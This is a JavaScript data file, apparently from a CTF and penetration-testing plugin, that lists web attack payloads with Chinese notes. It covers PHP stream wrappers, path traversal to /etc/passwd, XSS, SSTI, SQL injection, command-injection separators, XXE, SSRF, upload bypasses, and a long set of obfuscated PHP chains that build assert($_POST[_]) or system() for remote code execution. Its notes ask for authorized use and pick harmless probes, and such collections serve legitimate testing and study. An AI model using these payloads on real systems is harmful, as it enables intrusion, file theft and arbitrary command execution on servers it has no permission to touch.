(function (root) {
  "use strict";

  root.CtfPayloads = [
    {
      id: "php-wrapper",
      name: "PHP 伪协议 / 包装器",
      tags: ["php", "lfi", "include"],
      note: "来自 PHP 手册公开的 stream wrappers。用于 CTF 文件包含题与授权测试中的只读验证。",
      items: [
        { title: "读取源码（不执行）", payload: "php://filter/convert.base64-encode/resource=index.php", desc: "include/require 场景下把 PHP 源码以 Base64 读出。" },
        { title: "多重编码混淆路径", payload: "php://filter/read=convert.base64-encode/resource=index.php", desc: "部分 WAF 只匹配 resource= 前的简单 filter。" },
        { title: "ROT13 读源码", payload: "php://filter/read=string.rot13/resource=index.php", desc: "输出 ROT13，适合过滤了 base64-encode 的题目。" },
        { title: "字符转换链", payload: "php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php", desc: "iconv 过滤器常用于绕过简单黑名单。" },
        { title: "输入流", payload: "php://input", desc: "POST body 作为 include 内容；需允许 allow_url_include 或纯 include 包装器。" },
        { title: "标准输入", payload: "php://stdin", desc: "较少见，部分 CLI / 特殊 SAPI 可用。" },
        { title: "内存流", payload: "php://memory", desc: "读写内存流，审计中偶见。" },
        { title: "临时流", payload: "php://temp", desc: "超过 2KB 会落到临时文件。" },
        { title: "过滤空", payload: "php://filter/resource=index.php", desc: "无转换直接读，确认包装器是否可用。" },
        { title: "data 包装器", payload: "data://text/plain,<?php phpinfo(); ?>", desc: "allow_url_include=On 时作为 include 目标。" },
        { title: "data + Base64", payload: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", desc: "同上，内容为 `<?php phpinfo(); ?>` 的 Base64。" },
        { title: "zip 包装器", payload: "zip://shell.zip#shell.php", desc: "压缩包内文件包含；需 zip 扩展。" },
        { title: "phar 包装器", payload: "phar://archive.phar/file.txt", desc: "读取 phar 内文件；反序列化利用不在本插件范围内。" },
        { title: "expect 包装器", payload: "expect://id", desc: "需 expect 扩展，通常默认关闭。" },
        { title: "file 绝对路径", payload: "file:///etc/passwd", desc: "Linux 通用存在性探针，仅读取公开系统文件。" },
        { title: "Windows hosts", payload: "file://C:/Windows/win.ini", desc: "Windows 存在性探针。" }
      ]
    },
    {
      id: "lfi",
      name: "路径穿越 / LFI",
      tags: ["lfi", "path", "file"],
      note: "公开路径穿越写法。验证时只读取少量可证明文件，不要批量翻敏感数据。",
      items: [
        { title: "基础穿越", payload: "../../../../../../etc/passwd", desc: "最常见的相对路径穿越。" },
        { title: "编码斜杠", payload: "..%2f..%2f..%2fetc%2fpasswd", desc: "URL 编码 `/`。" },
        { title: "双重编码", payload: "..%252f..%252f..%252fetc%252fpasswd", desc: "WAF 只解码一次时可能漏过。" },
        { title: "点号编码", payload: "%2e%2e/%2e%2e/%2e%2e/etc/passwd", desc: "编码 `.`。" },
        { title: "16 位 Unicode 斜杠", payload: "..%c0%af..%c0%af..%c0%afetc/passwd", desc: "过期 IIS/Tomcat 的过长 UTF-8。" },
        { title: "空字节截断（老 PHP）", payload: "../../../../etc/passwd%00", desc: "仅 PHP < 5.3.4 且 magic 路径拼接时有效。" },
        { title: "空字节 + 后缀", payload: "../../../../etc/passwd%00.png", desc: "绕过后缀白名单的历史手法。" },
        { title: "当前目录干扰", payload: "....//....//....//etc/passwd", desc: "`....//` 规范化后变成 `../`。" },
        { title: "反斜杠（Windows）", payload: "..\\..\\..\\windows\\win.ini", desc: "Windows 路径分隔。" },
        { title: "包装器 + 穿越", payload: "php://filter/convert.base64-encode/resource=../../../../etc/passwd", desc: "LFI 与过滤器组合。" },
        { title: "Nginx 日志包含思路", payload: "/var/log/nginx/access.log", desc: "需先把 PHP 代码打进日志，再 include 日志文件。仅靶场使用。" },
        { title: "Session 包含思路", payload: "/tmp/sess_PHPSESSID", desc: "把 Payload 写入会话后再 include session 文件。" }
      ]
    },
    {
      id: "xss",
      name: "XSS 探针 / 绕过（公开写法）",
      tags: ["xss", "html"],
      note: "OWASP / PortSwigger 公开 Cheat Sheet 中的常见探针。本插件不提供针对具体站点的利用链。",
      items: [
        { title: "基础 script", payload: "<script>alert(1)</script>", desc: "无过滤时的存在性探针。" },
        { title: "img onerror", payload: "<img src=x onerror=alert(1)>", desc: "标签黑名单只拦 script 时。" },
        { title: "svg onload", payload: "<svg onload=alert(1)>", desc: "HTML5 事件。" },
        { title: "body onload", payload: "<body onload=alert(1)>", desc: "完整 HTML 上下文。" },
        { title: "details ontoggle", payload: "<details open ontoggle=alert(1)>", desc: "较少被黑名单覆盖的事件。" },
        { title: "video onerror", payload: "<video><source onerror=alert(1)>", desc: "媒体标签事件。" },
        { title: "大小写混淆", payload: "<ScRiPt>alert(1)</sCrIpT>", desc: "正则只匹配小写 script。" },
        { title: "无引号 + 注释截断", payload: "<img src=x onerror=alert(1)//", desc: "属性未加引号，用注释吃掉后面的原有代码。" },
        { title: "反引号（老 IE）", payload: "<img src=`x` onerror=alert(1)>", desc: "历史浏览器。" },
        { title: "HTML 实体", payload: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", desc: "关键字被替换时。" },
        { title: "十六进制实体", payload: "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>", desc: "同上。" },
        { title: "javascript 伪协议", payload: "<a href=javascript:alert(1)>x</a>", desc: "href 上下文。" },
        { title: "大小写 javascript", payload: "<a href=JaVaScRiPt:alert(1)>x</a>", desc: "协议黑名单绕过。" },
        { title: "斜杠代替空格", payload: "<svg/onload=alert(1)>", desc: "标签与事件之间不用空格。" },
        { title: "模板字符串", payload: "<img src=x onerror=alert`1`>", desc: "括号被过滤。" },
        { title: "fromCharCode", payload: "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", desc: "关键字检测。" },
        { title: "闭合已有标签", payload: "\"><script>alert(1)</script>", desc: "属性值上下文。" },
        { title: "单引号属性", payload: "'-alert(1)-'", desc: "JS 字符串上下文。" },
        { title: "DOM innerHTML", payload: "<img src=x onerror=alert(document.domain)>", desc: "确认执行源。" }
      ]
    },
    {
      id: "ssti",
      name: "SSTI 模板注入探针",
      tags: ["ssti", "template"],
      note: "先用算术探针确认引擎，再查对应手册。不要一上来执行系统命令。",
      items: [
        { title: "通用算术", payload: "{{7*7}}", desc: "Jinja2 / Twig / Nunjucks 等。" },
        { title: "${} 算术", payload: "${7*7}", desc: "Java EL / Freemarker / Thymeleaf。" },
        { title: "#{} 算术", payload: "#{7*7}", desc: "部分 Java EL。" },
        { title: "<% %>", payload: "<%= 7*7 %>", desc: "ERB / EJS。" },
        { title: "{%%}", payload: "{% raw %}{{7*7}}{% endraw %}", desc: "区分是否被当成 Jinja 语句。" },
        { title: "Jinja2 对象", payload: "{{config}}", desc: "Flask/Jinja 配置泄露探针。" },
        { title: "Jinja2 self", payload: "{{self}}", desc: "确认 Jinja 环境。" },
        { title: "Jinja2 request", payload: "{{request}}", desc: "Flask request 对象。" },
        { title: "Jinja2 lipsum 类", payload: "{{lipsum.__globals__}}", desc: "后续才考虑 __builtins__；先确认对象存在。" },
        { title: "Twig dump", payload: "{{dump(app)}}", desc: "Twig debug。" },
        { title: "Freemarker", payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", desc: "仅本地靶场；生产环境禁止。" },
        { title: "Velocity", payload: "#set($x=7*7)$x", desc: "Apache Velocity。" },
        { title: "Smarty", payload: "{php}echo 7*7;{/php}", desc: "老版本 Smarty。" },
        { title: "Pug / Jade", payload: "#{7*7}", desc: "Node 模板。" }
      ]
    },
    {
      id: "sqli",
      name: "SQL 注入探针",
      tags: ["sqli", "sql"],
      note: "布尔 / 报错 / 延时探针，用于确认注入点。不要对未授权目标跑 sqlmap 式枚举。",
      items: [
        { title: "单引号", payload: "'", desc: "报错差异。" },
        { title: "双引号", payload: "\"", desc: "字符串定界。" },
        { title: "注释 --+", payload: "'--+", desc: "MySQL 注释。" },
        { title: "注释 #", payload: "'#", desc: "MySQL `#` 注释。" },
        { title: "/**/ 注释", payload: "'/**/OR/**/1=1--+", desc: "空格被过滤。" },
        { title: "布尔真", payload: "' OR 1=1--+", desc: "登录框经典探针。" },
        { title: "布尔假", payload: "' OR 1=2--+", desc: "与真值对比。" },
        { title: "数字布尔", payload: "1 OR 1=1", desc: "整型参数。" },
        { title: "UNION 探测列数", payload: "' UNION SELECT NULL--+", desc: "逐步增加 NULL 数量。" },
        { title: "ORDER BY", payload: "' ORDER BY 1--+", desc: "探测列数。" },
        { title: "报错 UpdateXML", payload: "' AND updatexml(1,concat(0x7e,version()),1)--+", desc: "MySQL 报错。" },
        { title: "报错 ExtractValue", payload: "' AND extractvalue(1,concat(0x7e,version()))--+", desc: "MySQL 报错。" },
        { title: "延时 MySQL", payload: "' AND SLEEP(3)--+", desc: "盲注时间差，3 秒即可，避免 DoS。" },
        { title: "延时 PostgreSQL", payload: "'; SELECT pg_sleep(3);--+", desc: "堆叠 + 延时。" },
        { title: "延时 MSSQL", payload: "'; WAITFOR DELAY '0:0:3'--+", desc: "MSSQL。" },
        { title: "延时 Oracle", payload: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1--+", desc: "Oracle。" },
        { title: "宽字节", payload: "%df'", desc: "GBK 宽字节吃掉转义反斜杠。" },
        { title: "二次 URL 编码", payload: "%2527", desc: "`'` 的双重编码。" }
      ]
    },
    {
      id: "cmdi",
      name: "命令注入分隔",
      tags: ["cmd", "rce"],
      note: "只用于确认输入是否进入 shell。优先无害命令如 `id` / `whoami`，禁止破坏性命令。",
      items: [
        { title: "分号", payload: ";id", desc: "POSIX sh。" },
        { title: "管道", payload: "|id", desc: "把原命令输出丢掉。" },
        { title: "逻辑与", payload: "&&id", desc: "前命令成功才执行。" },
        { title: "逻辑或", payload: "||id", desc: "前命令失败才执行。" },
        { title: "反引号", payload: "`id`", desc: "命令替换。" },
        { title: "$()", payload: "$(id)", desc: "命令替换。" },
        { title: "换行", payload: "\nid", desc: "%0a。" },
        { title: "%0a", payload: "%0aid", desc: "URL 编码换行。" },
        { title: "Windows &", payload: "&whoami", desc: "cmd.exe。" },
        { title: "Windows |", payload: "|whoami", desc: "cmd.exe。" },
        { title: "空格 $IFS", payload: "cat${IFS}/etc/passwd", desc: "空格被过滤。" },
        { title: "空格 {,}", payload: "cat</etc/passwd", desc: "重定向代替 cat 参数空格。" }
      ]
    },
    {
      id: "xxe",
      name: "XXE 探针",
      tags: ["xxe", "xml"],
      note: "外部实体只读验证。不要打内网元数据接口，不要做端口扫描。",
      items: [
        { title: "文件读取骨架", payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>", desc: "经典 XXE 读文件。" },
        { title: "Windows 文件", payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><r>&xxe;</r>", desc: "Windows 探针。" },
        { title: "参数实体", payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><r/>", desc: "有些解析器只展开参数实体。" },
        { title: "PHP expect（少见）", payload: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"expect://id\">]><r>&xxe;</r>", desc: "需 expect 包装器。" },
        { title: "SVG XXE", payload: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>", desc: "上传 SVG 场景。" }
      ]
    },
    {
      id: "ssrf",
      name: "SSRF 探针（本机回环）",
      tags: ["ssrf"],
      note: "仅用回环与公开示例。按授权边界，不主动打云元数据、内网网段。",
      items: [
        { title: "本机 HTTP", payload: "http://127.0.0.1/", desc: "最基本回环。" },
        { title: "localhost", payload: "http://localhost/", desc: "名称解析。" },
        { title: "IPv6 回环", payload: "http://[::1]/", desc: "过滤只拦 IPv4 时。" },
        { title: "十进制 IP", payload: "http://2130706433/", desc: "127.0.0.1 的 DWORD。" },
        { title: "八进制 IP", payload: "http://0177.0.0.1/", desc: "127.0.0.1。" },
        { title: "短地址", payload: "http://127.1/", desc: "部分解析器认作 127.0.0.1。" },
        { title: "重定向提示", payload: "http://example.com 再 302 到 127.0.0.1", desc: "服务端若跟随跳转，可用自己的公网 302（需授权）。" },
        { title: "file 协议", payload: "file:///etc/passwd", desc: "SSRF 若支持 file: 则变成读文件。" },
        { title: "gopher 提示", payload: "gopher://127.0.0.1:6379/_INFO", desc: "仅说明协议形态，不对未授权 Redis 发利用。" }
      ]
    },
    {
      id: "ssti-el",
      name: "表达式 / 反序列化提示",
      tags: ["el", "deser"],
      note: "只放识别用的公开探针，不附带完整利用链或 exploit。",
      items: [
        { title: "Java EL", payload: "${7*7}", desc: "确认 EL 求值。" },
        { title: "OGNL 识别", payload: "%{7*7}", desc: "Struts 风格。" },
        { title: "SpEL", payload: "#{7*7}", desc: "Spring。" },
        { title: "PHP 序列化头", payload: "O:1:\"A\":0:{}", desc: "识别 `unserialize` 输入形态。" },
        { title: "Java ACED", payload: "rO0ABXNy", desc: "Java 序列化魔数 `ac ed 00 05` 的 Base64 开头。" },
        { title: "Python pickle 协议", payload: "gASV", desc: "pickle protocol 4 常见 Base64 开头，仅用于识别。" }
      ]
    },
    {
      id: "upload",
      name: "文件上传绕过思路",
      tags: ["upload"],
      note: "只列校验绕过思路。插件不会生成 webshell 文件。",
      items: [
        { title: "双后缀", payload: "shell.php.jpg", desc: "Apache 多后缀解析（老配置）。" },
        { title: "大小写", payload: "shell.pHp", desc: "Windows 大小写不敏感。" },
        { title: "空格截断（Win）", payload: "shell.php ", desc: "NTFS 去尾空格。" },
        { title: "点截断（Win）", payload: "shell.php.", desc: "NTFS 去尾点。" },
        { title: "::$DATA", payload: "shell.php::$DATA", desc: "NTFS ADS，老 IIS。" },
        { title: ".htaccess 思路", payload: "AddType application/x-httpd-php .png", desc: "仅当目录允许覆盖 Apache 处理器。" },
        { title: "Content-Type", payload: "image/jpeg", desc: "改 MIME，文件内容仍应是无害测试图。" },
        { title: "GIF89a 头", payload: "GIF89a<?php echo 1; ?>", desc: "图片马思路示意；实际测试请用无害文件。" }
      ]
    },
    {
      id: "php-rce-bypass",
      name: "PHP 无字母数字 RCE 绕过",
      tags: ["php", "rce", "eval", "assert", "bypass"],
      note: "整理自本地网安笔记《无数字字母 rce / RCE专题》：自增、异或、取反、或、通配符。用于 CTF eval/assert 被过滤字母数字时。构造器可按函数名即时生成，不必死记整段。",
      items: [
        { title: "原理：空数组拼出 A", payload: "$_=[].'';$___=$_[$__];", desc: "`[].''` 强制转成字符串 `Array`；未定义 `$__` 当 0，取出首字母 `A`。后续自增都从这里开始。" },
        { title: "原理：未定义变量自增得数字", payload: "$_++;", desc: "未定义 `$_` 视为 NULL≈0，自增得到 1。过滤数字时用这个拿下标。" },
        { title: "原理：字母自增", payload: "$_=([].'')[0];$_++;", desc: "`A++`→`B`，一直加到需要的字母。`++$_` 先加再返回，`$_++` 先返回再加。" },
        { title: "自增：拼 assert($_POST[_])", payload: "$_=[].'';$___=$_[$__];$__=$___;$_=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$___.=$__;$__=$_;$____='_';$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__++;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$___($_[_]);", desc: "笔记标准链：`Array[0]`→A，自增拼 `ASSERT` 与 `_POST`，等价 `assert($_POST[_])`。POST 字段名 `_`。" },
        { title: "自增：短写法拼 system", payload: "$_=([].'')[+!![]];", desc: "若允许 `!`：`!![]` 为 true→1，取 `Array[1]` 得到 `r`，再自增减到目标字母。更短但依赖允许 `!`。" },
        { title: "自增：动态函数调用", payload: "$_=(_/_._)[''=='_'];", desc: "笔记变体：用布尔下标从 `(1/1.0)` 一类表达式取字符。完整链见 `payload=$_=(_/_._)...$$__[__]($$__[_]);` 再 POST `__=system`、`_=ls`。" },
        { title: "自增：POST 传函数名", payload: "payload=$_=(_/_._)[''=='_'];$_++;$__=$_++;$__=$_.$__;$_++;$_++;$_++;$__=$__.$_++.$_++;$_=$__;$__='_';$__.=$_;$$__[__]($$__[_]);", desc: "笔记 RCE 专题自增 payload。配合 `&__=system` 与 `&=ls`（字段名按题目）。" },
        { title: "异或：反引号拼字母", payload: "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);", desc: "`chr^0x60` 得到字母。本段拼出 `assert` 与 `_POST`，调用 `assert($_POST[_])`。" },
        { title: "异或：可见字符拼 assert/_POST", payload: "$_=\"!((%)(\"^\"@[[@[\\\\\";$__=\"!+/((\"^\"~{`{|\";$___=$$__;$_($___[_]);", desc: "两边都是可见非字母。需要 URL 编码后再发包。等价 `assert($_POST[_])`。" },
        { title: "异或：拼 _POST 五字符", payload: "$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\");", desc: "`#^|`→`_`，`.^~`→`P`，`/^``→`O`，`|^/`→`S`，`{^/`→`T`，得到 `_POST`。" },
        { title: "异或：${ } 调 $_GET", payload: "${\"`{{{\"^\"?<>/\"}['+']();", desc: "`\"`{{{\"^\"?<>/\"` → `_GET`。再 `&+=id` 把命令放进 GET 参数 `+`。按题目改命令。" },
        { title: "异或：高位异或 0xFF", payload: "${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();", desc: "每个字节 ^0xFF 得到函数名，参数名同样是高位字节。正则 `[A-Za-z0-9]` 通常拦不住。" },
        { title: "取反：phpinfo()", payload: "(~%8F%97%8F%96%91%99%90)();", desc: "`~'phpinfo'` 后 URL 编码。对不可见字节再取反还原函数名，绕过字母数字正则。" },
        { title: "取反：assert(eval($_POST[1]))", payload: "(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);", desc: "外层 `~assert`，内层 `~eval($_POST[1]);`。POST 字段 `1` 放要执行的语句。" },
        { title: "取反：assert + _POST[_]", payload: "$_=~\"%9e%8c%8c%9a%8d%8b\";$__=~\"%a0%af%b0%ac%ab\";$___=$$__;$_($___[_]);", desc: "`~` 得到 `assert` 与 `_POST`。比上一行好读，注意发包时保持 URL 编码。" },
        { title: "取反：生成模板", payload: "(~FUNC)(~ARG);", desc: "本地用 `urlencode(~'system')` 生成 FUNC，ARG 同理。插件上方「PHP 绕过构造」可直接出结果。" },
        { title: "或：system + ls", payload: "(\"%13%19%13%14%05%0d\"|\"%60%60%60%60%60%60\")(\"%0c%13\"|\"%60%60\")", desc: "低字节 `| 0x60` 抬成小写字母。笔记原文是 `system('ls')`（`%0c%13|%60%60`→ls）。要 `id` 用上面的构造器。" },
        { title: "无参：列目录", payload: "var_dump(scandir(current(localeconv())));", desc: "`localeconv()` 当前元素是小数点 `.`，当作当前目录。不过滤字母时的无参列目录。" },
        { title: "无参：读文件", payload: "show_source(array_rand(array_flip(scandir(current(localeconv())))));", desc: "键值翻转后随机取文件名再 `show_source`。多刷新几次撞到 flag。" },
        { title: "通配符：cat /etc/passwd", payload: "c''at /e't'c/pass?d", desc: "空引号打断关键字，`?` 配单字符。给 `system()` / 反引号。" },
        { title: "通配符：绝对路径 cat", payload: "/???/?at /e't'c/*ss*", desc: "`/bin/cat` 写成 `/???/?at`。过滤空格时再叠 `${IFS}`。" },
        { title: "通配符：短标签执行", payload: "?><?=`??? ???`?>", desc: "无字母数字时用 `?><?=` 短标签 + 反引号通配符。具体命令长度随环境变。" },
        { title: "动态调用（未过滤字母）", payload: "?a=system&b=id", desc: "`$a($b)` 一类题目：参数名当函数，参数值当命令。确认点，不是绕过。" }
      ]
    }
  ];
})(window);
